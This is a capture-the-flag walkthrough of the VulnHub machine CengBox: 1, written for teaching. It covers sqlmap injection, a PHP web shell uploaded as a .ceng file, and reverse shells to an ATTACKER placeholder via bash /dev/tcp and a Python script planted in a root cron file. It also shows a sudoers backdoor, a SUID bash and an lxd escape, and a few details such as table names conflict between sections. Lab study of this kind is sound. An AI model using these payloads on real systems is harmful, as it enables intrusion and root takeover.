# Machine 9 — CengBox: 1

> **Position:** 9 of 13 · **Band 3 — Easy** (global rank **018** of 708)
> **Full writeup:** [`labs/3-018-cengbox-1/README.md`](../../labs/3-018-cengbox-1/README.md)

| | |
| --- | --- |
| **Machine** | CengBox: 1 |
| **Author** | Arslan Bilecen (`@arslanblcn_`) |
| **Released** | 30 April 2020 |
| **Target** | Ubuntu — Apache 2.4.x, PHP, MySQL, a **custom PHP admin panel** |
| **VulnHub** | [entry/cengbox-1,475](https://vulnhub.com/entry/cengbox-1,475/) |
| **Goal** | User flag + root flag |
| **Estimated time** | 5–8 hours |

---

## Why this machine is here

This is the path's **hardest web machine**, and it earns that by teaching two things
properly rather than one thing shallowly.

1. **SQL injection as a real technique**, not a magic string. You will use `sqlmap`
   against a login form with `--forms`, and you will watch it work through
   **boolean-blind**, **time-blind** and **UNION** detection in sequence. Then you
   will dump a database that stores the administrator's password **in plaintext**.
2. **Seeing what root is doing.** `ps` only shows processes; **`pspy`** shows
   short-lived processes started by *other users* — including cron jobs that run and
   exit between your keystrokes. That is how you find `/opt/md5check.py`, running as
   root every few seconds and **world-writable**.

It also has a genuinely elegant upload-filter bypass, where the filter checks *only*
the extension and the server is configured to execute a **custom extension** as PHP.

## Learning objectives

1. **Escalate wordlists** and use the **`-X` extension trick** with `dirb`/`gobuster`.
2. Run `sqlmap` against a **POST login form** and read every stage of its output.
3. Explain the difference between **boolean-blind**, **time-blind** and **UNION**
   injection, and why `sqlmap` tries them in that order.
4. Dump a database (`--dbs`, `--tables`, `--dump`, `--dump-all`) and interpret it.
5. Understand why **storing a plaintext password** in a database is worse than a weak
   hash.
6. Bypass an **extension-only upload filter** by finding an extension the server
   already executes.
7. Use **`pspy`** to observe root-owned processes you cannot otherwise see.
8. Exploit a **world-writable script executed by root**, and explain why a "tamper
   detection" script that is itself writable is worse than no script.
9. Know the **`lxd` group** alternative root path.

## Attack classes covered

| Class | Where on this box |
| --- | --- |
| Content discovery with escalating wordlists | `dirb big.txt` → **`/masteradmin/`**; then `-X .php` → `login.php`, `upload.php`, `adb.php` |
| **SQL injection — boolean-blind** | `login.php`, `username` POST parameter |
| **SQL injection — time-blind** | same |
| **SQL injection — UNION** | same |
| **Plaintext credential storage** | `cengbox.admin.password`, `varchar(64)` |
| **Upload filter bypass (extension allow-list)** | `upload.php` rejects `.php`, demands *"only CENG file allowed"* → **`.ceng`** is executed as PHP |
| Uploads inside the document root | `/var/www/html/uploads/` |
| **Credential reuse** | DB password `C3ng0v3R00T1!` = system password for **`cengover`** |
| **World-writable root cron script** | `/opt/md5check.py`, mode `777`, run as root every few seconds |
| Defeated integrity control | The "tamper detection" script *is* the tampering vector |
| **`lxd` group membership** | `110(lxd)` → alternative root |

## Read first

- [02 — Web Attacks](../02-Web-Attacks.md) **§4** (SQL injection in full) and **§5**
  (file upload → web shell), plus §3 for content discovery.
- [05 — Linux Privilege Escalation](../05-Linux-Privilege-Escalation.md) **§4** (cron)
  and **§8** (groups — `lxd`).
- [04 — Credentials and Cracking](../04-Credentials-and-Cracking.md) §5 (reuse).
- [06 — Shells, Persistence and Escapes](../06-Shells-Persistence-and-Escapes.md) §1.

## Before you start — answer these

1. A login form has two POST fields. How do you tell `sqlmap` to test them without
   hand-crafting a request?
2. What is the observable difference between a **boolean-blind** and a
   **time-blind** injection?
3. An upload filter says "only `.ceng` files allowed". What is your *first* question
   about the server's configuration?
4. Why is a plaintext password in a database a worse finding than a fast hash?
5. `ps aux` shows nothing unusual. What tool would show you a root process that runs
   for 200 ms every 5 seconds?

## Hints ladder

<details>
<summary><strong>Rung 1 — a nudge</strong></summary>

Ports 22 and 80. The homepage will not tell you much. Run `dirb` with a **large**
wordlist — `common.txt` is not enough here — and look for an administration
directory.

Once you find it, run `dirb` **again inside that directory** with an extension list.
The panel is PHP; the pages are PHP.
</details>

<details>
<summary><strong>Rung 2 — the panel and the injection</strong></summary>

```bash
dirb http://TARGET/ /usr/share/dirb/wordlists/big.txt
# -> /masteradmin/
dirb http://TARGET/masteradmin/ /usr/share/dirb/wordlists/common.txt -X .php
# -> login.php, upload.php, adb.php
```

`login.php` is the injection point. Let `sqlmap` discover the form itself:

```bash
sqlmap -u "http://TARGET/masteradmin/login.php" --forms --batch --level 3 --risk 2
```

Read the output: it reports which parameter is injectable and which **techniques**
worked. Then:

```bash
sqlmap -u "http://TARGET/masteradmin/login.php" --forms --batch --dbs
sqlmap -u "..." --forms --batch -D cengbox --tables
sqlmap -u "..." --forms --batch -D cengbox -T admin --dump
```

The `password` column is **`varchar(64)` plaintext**: `masteradmin : C3ng0v3R00T1!`.
</details>

<details>
<summary><strong>Rung 3 — the upload filter</strong></summary>

Log in to the panel and go to `upload.php`. Uploading `shell.php` is refused with
**"only CENG file allowed"**.

The filter checks **only the extension**. The question is therefore: *what other
extension does this server execute as PHP?* Check the Apache configuration:

```bash
grep -rniE 'AddHandler|AddType|application/x-httpd-php' /etc/apache2/ 2>/dev/null
```

**`.ceng`** is mapped to the PHP handler. So name your shell
**`shell.php.ceng`** (or `shell.ceng` containing PHP) and upload it. It lands in
**`/var/www/html/uploads/`** and executes when requested → RCE as **`www-data`**.
</details>

<details>
<summary><strong>Rung 4 — user flag and the root path</strong></summary>

**User flag:** the DB password is reused. `su cengover` with `C3ng0v3R00T1!` works.

**Root:** `ps aux` shows nothing. Use **`pspy`**, which watches the kernel and
reports processes as they start — including other users':

```bash
wget http://ATTACKER:8000/pspy64 && chmod +x pspy64 && ./pspy64
```

Within seconds you will see **`/opt/md5check.py`** launched as **root**, repeatedly.
Check it:

```bash
ls -l /opt/md5check.py      # -rwxrwxrwx  root root
```

**Mode 777, owned by root, executed by root.** Replace it:

```bash
cp /opt/md5check.py /tmp/bak.py
echo 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])' > /opt/md5check.py
# nc -lvnp 4444  -> root within seconds
```
</details>

<details>
<summary><strong>Rung 5 — the answer</strong></summary>

1. `nmap` → **22**, **80**.
2. `dirb` with **`big.txt`** → **`/masteradmin/`**; `dirb -X .php` inside it →
   **`login.php`**, **`upload.php`**, `adb.php`.
3. **`sqlmap --forms`** on `login.php` → injectable `username` parameter
   (boolean-blind, time-blind, UNION) → database **`cengbox`**, table **`admin`** →
   **`masteradmin : C3ng0v3R00T1!`** (stored **plaintext**, `varchar(64)`).
4. `upload.php` rejects `.php` — *"only CENG file allowed"* → upload
   **`shell.php.ceng`** → stored in **`/var/www/html/uploads/`** and executed as PHP
   → **`www-data`**.
5. **Credential reuse:** `su cengover` with the same password → **user flag**.
6. **`pspy`** reveals **`/opt/md5check.py`** run as root every few seconds; it is
   **mode 777** → overwrite with a reverse shell → **root flag**.
7. **Alternative root:** `cengover` is in the **`lxd`** group →
   `lxc init ubuntu s -c security.privileged=true` → mount host `/` → root.
   Also present but inert: `cengover` appears in `/etc/group`'s `sudo` line with no
   matching `sudoers` rule.
</details>

## After you finish — review questions

1. `sqlmap` reported several injection techniques. Which one did it confirm *first*,
   and why is that order sensible?
2. Explain **boolean-blind** injection in your own words: what is the attacker
   actually observing, and why does it take many requests?
3. Why would you use `--level 3 --risk 2` here rather than the defaults? What are the
   risks of raising them further on a production system?
4. The admin password was stored in plaintext. Is that better or worse than storing
   it as unsalted MD5, from the *defender's* point of view? Explain.
5. Why did `.ceng` execute as PHP? What does that tell you about where the real
   vulnerability was — the upload filter or the web server configuration?
6. What does `pspy` do that `ps` cannot? Why is that difference essential for finding
   short-lived cron jobs?
7. The script was named `md5check.py` — an *integrity* control. Why did it fail as
   one, and what would a real integrity control look like?
8. You had two independent root paths. Which is the "correct" one to report, and how
   do you report the other?

## Defensive reflection

| Finding | Fix |
| --- | --- |
| Guessable `/masteradmin/` directory | Directory obscurity is not a control. Authenticate it, and place it behind a VPN or IP allow-list |
| **SQL injection in `login.php`** | **Parameterised queries / prepared statements.** Never concatenate input into SQL. Add a WAF rule as a stopgap only |
| **Admin password stored in plaintext** | Hash with bcrypt/argon2 + per-user salt. A plaintext password column is a reportable incident even without a breach |
| Extension-only upload filter | Validate **content** (magic bytes), store uploads **outside the document root**, and serve them with a `Content-Disposition: attachment` header and a non-executing handler |
| `.ceng` mapped to the PHP handler | Remove unnecessary `AddHandler`/`AddType` mappings. Every extra executable extension is an upload-bypass vector |
| Uploads inside `/var/www/html/uploads/` | Move to a non-executing location; set `php_admin_flag engine off` for that directory |
| DB password reused as a system password | Unique credentials per system; use a secrets manager |
| **`/opt/md5check.py` mode 777, run by root** | `chmod 700`, owner `root`. Never let a root-executed script be writable by anyone else |
| A "tamper detection" script that is itself writable | Integrity controls must be **immutable to the thing they protect** — use AIDE/Tripwire with the database stored read-only or off-host |
| `lxd` group for an ordinary user | Remove the membership. `lxd` (like `docker`) is root-equivalent |
| `gcc` on a server | Remove build tooling from production images |

**The single biggest lesson:** *a control that can be modified by the thing it
controls is not a control.* That is true of `md5check.py`, of an extension-only upload
filter, and of a plaintext password column.

---

## The commands, annotated — every input and every output

Published walkthroughs use `192.168.56.106` for the target and `192.168.56.10` for Kali.

### 1. Scan

```bash
sudo nmap -A -p- -T4 -oN scans/cengbox.txt TARGET
```

```text
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: CengBox
|_http-server-header: Apache/2.4.29 (Ubuntu)
OS details: Linux 4.15 - 5.5
```

`-A` is shorthand for `-sV -sC -O --traceroute` — versions, default scripts, OS detection and
route, all at once. `OpenSSH 7.6p1 Ubuntu 4ubuntu0.3` plus `Apache 2.4.29 ((Ubuntu))` pins
**Ubuntu 18.04**. Two ports, so the whole attack is in the web application.

### 2. Content discovery — and why the small list fails

```bash
curl -s http://TARGET/ | head -30
curl -s -o /dev/null -w '%{http_code}\n' http://TARGET/robots.txt
dirb http://TARGET/ /usr/share/dirb/wordlists/common.txt
```

```text
404
```
```text
---- Scanning URL: http://192.168.56.106/ ----
==> DIRECTORY: http://192.168.56.106/uploads/
DOWNLOADED: 4612 - FOUND: 1
```

`robots.txt` returns **`404`** — nothing leaked. `-o /dev/null -w '%{http_code}'` prints only
the status, which is the fast way to test for a file's existence without reading its body.
dirb found one directory: `/uploads/`.

**Stop and reason about that.** An `/uploads/` directory with no application to upload *from*
means the picture is incomplete — something is hidden. Escalate the wordlist:

```bash
dirb http://TARGET/ /usr/share/dirb/wordlists/big.txt
```

```text
==> DIRECTORY: http://192.168.56.106/masteradmin/
==> DIRECTORY: http://192.168.56.106/uploads/
DOWNLOADED: 20469 - FOUND: 2
```

`common.txt` (4,612 entries) missed `/masteradmin`; `big.txt` (20,469) found it. **That is the
lesson of phase one: `common.txt` is not enough.** The progression worth memorising is
`dirb/common.txt` (4.6 k) → `dirb/big.txt` (20 k) → `directory-list-2.3-medium.txt` (220 k) →
`SecLists/…/directory-list-2.3-big.txt` (1.3 M) → `raft-large-directories.txt`. Escalate
before concluding a box is bare.

### 3. Rescan the new directory *with extensions*

```bash
dirb http://TARGET/masteradmin/ /usr/share/dirb/wordlists/big.txt -X .php
```

```text
+ http://192.168.56.106/masteradmin/login.php (CODE:200|SIZE:1194)
+ http://192.168.56.106/masteradmin/adb.php (CODE:302|SIZE:0)
+ http://192.168.56.106/masteradmin/upload.php (CODE:302|SIZE:0)
```

`-X .php` **appends the extension to every wordlist entry** (equivalent to `gobuster -x php`).
PHP applications hide their real surface behind `.php` files a plain directory scan never
guesses. Read the three results: `login.php` at **`200` with a real size** is the injectable
form; `upload.php` and `adb.php` at **`302` with `SIZE:0`** redirect because you are not
authenticated — but their *existence* is now known, and `upload.php` is your eventual goal.

### 4. Record the manual failures first

| Username | Password | Result |
| --- | --- | --- |
| `admin` | `admin` | "Invalid credentials" |
| `masteradmin` | `masteradmin` | "Invalid credentials" |
| `' OR 1=1-- -` | `x` | "Invalid credentials" |

Trying the obvious by hand takes a minute and tells you the form is not trivially bypassable,
so the injection is subtler than `' OR 1=1--`. Note the message is the *same* for a bad
username and a bad password — good practice, and the reason you need `sqlmap` rather than
guessing.

### 5. Let `sqlmap` find the injection

```bash
sqlmap -u "http://TARGET/masteradmin/login.php" --forms --batch --level 3 --risk 2
```

```text
[17:22:41] [INFO] testing connection to the target URL
[17:22:41] [INFO] searching for forms
[17:22:42] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[17:22:44] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[17:23:12] [INFO] GET parameter 'username' appears to be 'MySQL >= 5.0.12 AND time-based blind' injectable
[17:23:12] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[17:23:19] [INFO] target URL appears to be UNION injectable with 3 columns
[17:23:19] [CRITICAL] parameter 'username' is vulnerable. Do you want to keep testing the others? [y/N] N
sqlmap identified the following injection point(s):
---
Parameter: username (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: username=admin' AND 1=1-- -&password=x
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=admin' AND SLEEP(5)-- -&password=x
    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: username=admin' UNION ALL SELECT NULL,NULL,CONCAT(0x71706a7871,0x616263,0x71626b6271)-- -&password=x
---
[17:23:20] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 18.04
back-end DBMS: MySQL >= 5.0.12
```

Every flag is a decision:

| Flag | Meaning |
| --- | --- |
| `--forms` | fetch the page, parse its `<form>`, and test every field — saves writing a raw request file |
| `--batch` | never prompt; take the default answer. Essential for scripted runs |
| `--level 3` | also test `User-Agent`, `Referer` and cookies (levels 4–5 add more HTTP headers) |
| `--risk 2` | how *dangerous* payloads may be. **Risk 3 adds time-based and heavy `OR` tests that could alter data — get written permission before risk 3 on a client system** |

Read the three identified techniques as three *proofs*, and note that all three were found on
the **same parameter** (`username`) — when a tool reports three independent techniques on one
field, the injection is real and deep. `CONCAT(0x71706a7871,…,0x71626b6271)` is sqlmap's
**marker trick**: `0x71…` is hex for `qpjxq`, so it wraps its output in a unique string it can
find again in the response — that is how UNION extraction works over a page whose layout you
cannot predict.

### 6. Dump the database

```bash
sqlmap -u "http://TARGET/masteradmin/login.php" --data="username=a&password=b" \
       -p username --batch --dbs
sqlmap -u "..." --data="username=a&password=b" -p username --batch -D cengbox --tables
sqlmap -u "..." --data="username=a&password=b" -p username --batch -D cengbox -T users --dump
```

```text
available databases [2]:
[*] cengbox
[*] information_schema
```
```text
Database: cengbox
[3 tables]
+---------+
| uploads |
| users   |
| config  |
+---------+
```
```text
Database: cengbox
Table: users
[1 entry]
+----+-------------+-----------------+
| id | username    | password        |
+----+-------------+-----------------+
| 1  | masteradmin | C3ng0v3R00T1!   |
+----+-------------+-----------------+
```

`--dbs` lists databases, `-D NAME --tables` lists tables, `-T NAME --dump` prints rows.
`-p username` pins the parameter you already proved vulnerable so sqlmap stops re-testing
everything else — a large time saving on repeat runs. `--data` supplies the POST body.

**Read the schema, not just the rows.** `password` in a `varchar(64)` column with no `$2y$` or
`$6$` prefix means the password is stored **in plaintext** — finding-grade, since anyone with
injection, a backup, or read access to the schema gets every administrator instantly. The
correct storage is `password_hash($pw, PASSWORD_ARGON2ID)` verified with `password_verify()`.
And note the `uploads` table already holds two **`.ceng`** files: that extension is the hint
for the next phase.

Log in at `/masteradmin/login.php` as `masteradmin` / `C3ng0v3R00T1!`.

### 7. The `.ceng` upload filter

`upload.php` rejects anything that is not `.ceng`. **Understand the filter before bypassing
it:** it checks the *extension string*. And this application **maps `.ceng` to the PHP
handler** — which is what turns a "documents only" rule into remote code execution.

```bash
cat > shell.ceng <<'EOF'
<?php system($_GET['cmd']); ?>
EOF
curl -s -b cookies.txt -F "file=@shell.ceng" http://TARGET/masteradmin/upload.php
curl -s "http://TARGET/uploads/shell.ceng?cmd=id"
```

```text
Upload successful
```
```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

`-F "file=@shell.ceng"` posts `multipart/form-data` with the field named `file`; the `@`
means "read this path". `-b cookies.txt` replays your authenticated session, without which you
get the `302` you saw in step 3. `uid=33(www-data)` is the expected landing: unprivileged but
on the server.

Every upload defence has a standard bypass — extension blacklist (`.phtml`, `.php5`, `.php7`,
`.pht`, `.phar`, case tricks, `.php.jpg`, null byte on old PHP); MIME-type check (the header is
**client-controlled and worthless** — change it in Burp); `getimagesize()` (prepend real image
bytes to make a polyglot). Here none of that was needed, because the *custom extension was
mapped to the interpreter*.

### 8. Reverse shell and TTY upgrade

```bash
nc -lvnp 4444                                     # Kali, first
curl -s "http://TARGET/uploads/shell.ceng?cmd=$(python3 -c "import urllib.parse as u;print(u.quote('bash -i >& /dev/tcp/ATTACKER/4444 0>&1'))")"
```

```text
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 192.168.56.106.
www-data@cengbox:/var/www/html$
```

**URL-encoding is not optional here.** `&`, `>` and spaces are all meaningful or illegal in a
query string, so sent raw the payload is truncated at the first `&` and nothing happens —
which looks like a broken shell. Generate the encoding rather than typing `%26` by hand.

Then upgrade: `python3 -c 'import pty; pty.spawn("/bin/bash")'`, `Ctrl+Z`, `stty raw -echo;
fg`, `export TERM=xterm`. Without the TTY, `su` fails with `standard input must be a tty` and
`Ctrl+C` kills your listener.

```bash
uname -a; hostname; cat /etc/os-release; pwd
for b in bash sh python python3 perl nc curl wget gcc socat; do command -v $b; done
```

Enumerate what is available **before** committing to a payload — this box has no `nc`, which is
why bash's `/dev/tcp` is the right choice.

### 9. Lateral movement — credential reuse

```bash
cat /etc/passwd | grep -E ':(1000|1001):'
su cengover
id
cat /home/cengover/user.txt
```

```text
cengover:x:1000:1000:cengover,,,:/home/cengover:/bin/bash
```
```text
uid=1000(cengover) gid=1000(cengover) groups=1000(cengover),110(lxd)
```

Read `grep -E ':(1000|1001):'` as "find lines whose UID/GID fields are real users" — system
accounts live below 1000. **The database password also works for the system account**:
credential reuse across systems. Then read the `id` output closely — **`groups=…,110(lxd)`**.
That group is equivalent to root, and it is your alternative escalation path.

### 10. Privilege escalation — cron shows nothing

```bash
crontab -l; cat /etc/crontab; ls -la /etc/cron.* /etc/cron.d/
```

```text
no crontab for cengover
```
```text
# /etc/crontab: system-wide crontab
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
```

All stock, nothing custom. The `/etc/crontab` fields are `min hour dom mon dow **user**
command` — note the *user* column, which per-user crontabs lack; **that column is what makes a
system cron job run as root.** Nothing here is exploitable.

### 11. `pspy` — see what `ps` cannot

`ps` and `/proc` only show what is running *right now*; a job firing every few seconds is easy
to miss between looks. `pspy` needs no root — it watches `inotify` events on `/proc` and logs
every process start and exit with the full command line and the UID that ran it.

```bash
wget http://ATTACKER:8000/pspy64 && chmod +x pspy64 && ./pspy64
```

```text
2024/05/04 19:02:11 CMD: UID=0     PID=1842   | /usr/bin/python /opt/md5check.py
2024/05/04 19:02:16 CMD: UID=0     PID=1845   | /usr/bin/python /opt/md5check.py
2024/05/04 19:02:21 CMD: UID=0     PID=1848   | /usr/bin/python /opt/md5check.py
```

Read each line as: **`UID=`** the effective user that started it (**0 = root**), **`PID=`** the
process id, and everything after the last `|` the **full command line**. The repeating
timestamps five seconds apart prove it is a timed job — and it is *not* in cron, so it is a
systemd timer or a `while true; sleep 5` loop. pspy does not care how it is scheduled; it just
reports that it runs.

```bash
ls -l /opt/md5check.py
cat /opt/md5check.py
```

```text
-rwxrwxrwx 1 root root 612 Oct 19 15:40 /opt/md5check.py
```
```python
#!/usr/bin/python
# Verify that /etc/passwd has not been tampered with.
# Compares the current md5 against the stored baseline and restores it if changed.
import hashlib, shutil
h = hashlib.md5(open('/etc/passwd','rb').read()).hexdigest()
if h != open('/opt/passwd.md5').read().strip():
    shutil.copy('/opt/passwd.bak','/etc/passwd')
```

**`-rwxrwxrwx` — mode `777`.** A root-owned script, executed **by root** every five seconds,
that **any user on the box can overwrite.** That is the entire privilege escalation. A
scheduled job is safe only if (1) the script is not writable by lower-privileged users,
(2) it never executes anything from a world-writable location, and (3) it uses absolute paths
throughout. **Rule 1 is broken here** — and the irony is perfect: the script's job is to
*detect tampering*, and it is itself the tampering vector.

### 12. Three payloads, and which to choose

**A — root reverse shell (most direct):**

```bash
cp /opt/md5check.py /tmp/md5check.py.bak        # ALWAYS keep a copy first
cat > /opt/md5check.py <<'EOF'
import socket, os, subprocess
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("ATTACKER", 4444))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
subprocess.call(["/bin/bash", "-i"])
EOF
# wait five seconds
```

`os.dup2(fd, 0/1/2)` points **stdin, stdout and stderr** at the socket, then `subprocess.call`
execs bash, which inherits them. Every reverse shell in every language is those three steps:
**connect → redirect stdio → exec a shell.** Note `/usr/bin/python` here is **Python 2**, so
this payload deliberately uses only syntax valid in both 2 and 3.

**B — grant passwordless sudo (survives a dropped connection, needs no egress):**

```bash
echo 'cengover ALL=(ALL) NOPASSWD:ALL' > /etc/sudoers.d/cengover && chmod 440 /etc/sudoers.d/cengover
sudo -i
```

Prefer a `/etc/sudoers.d/` drop-in to appending to `/etc/sudoers`: a syntax error in
`/etc/sudoers` locks *everyone* out of sudo (which is why `visudo` exists — it validates before
saving), whereas a bad drop-in affects only itself. `chmod 440` is required — sudo ignores
files with loose permissions.

**C — SUID root bash (persistence):**

```bash
cp /bin/bash /tmp/rb && chown root:root /tmp/rb && chmod 4755 /tmp/rb && /tmp/rb -p
id
```

```text
uid=1000(cengover) gid=1000(cengover) euid=0(root) egid=0(root) groups=1000(cengover),110(lxd)
```

`chmod 4755` — the leading **`4`** is the SUID bit, producing `-rwsr-xr-x root root`: whoever
executes it runs with the *owner's* identity. **`-p` is mandatory**: bash deliberately drops
its effective UID at startup unless invoked with `-p` ("privileged"), an explicit guard against
exactly this attack. Forgetting `-p` and getting `$` instead of `#` is the classic confusion.
Read the `id` output as a *SUID elevation, not a login*: real UID stays `1000(cengover)`,
**effective** UID becomes `0`, and permission checks use the effective UID.

```bash
cat /root/root.txt
cp /tmp/md5check.py.bak /opt/md5check.py && ls -l /opt/md5check.py    # restore afterwards
```

### 13. Alternative root — the `lxd` group

```bash
lxc image import ./alpine.tar.gz --alias privesc
lxc init privesc escape -c security.privileged=true
lxc config device add escape host disk source=/ path=/mnt/root recursive=true
lxc start escape
lxc exec escape -- /bin/sh
cat /mnt/root/root/root.txt
```

**Every flag in that sequence is load-bearing.** `-c security.privileged=true` **disables the
user namespace**, so container root *is* host root. `disk source=/ path=/mnt/root
recursive=true` **bind-mounts the host's entire `/`** into the container, including submounts.
`lxc exec … -- /bin/sh` gives you a shell inside, looking at the real host filesystem. Clean up
with `lxc stop escape && lxc delete escape && lxc image delete privesc`.

**Treat `lxd` and `docker` group membership as root — because it is.** Detect it with
`getent group docker lxd`; remediate with rootless LXD or rootless Docker/Podman.

---

_Back to [Learning Path 1](../README.md) · previous: [Machine 8 — Empire: Breakout](08-empire-breakout.md) · next: [Machine 10 — PwnLab: init](10-pwnlab-init.md) · full writeup: [`labs/3-018-cengbox-1`](../../labs/3-018-cengbox-1/README.md)._
